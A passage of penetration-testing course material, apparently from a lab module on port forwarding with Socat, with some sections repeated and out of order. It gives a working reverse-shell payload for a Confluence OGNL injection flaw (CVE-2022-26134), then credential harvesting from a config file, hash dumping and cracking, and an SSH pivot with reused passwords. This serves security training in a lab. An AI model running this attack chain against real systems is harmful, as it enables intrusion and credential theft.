We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
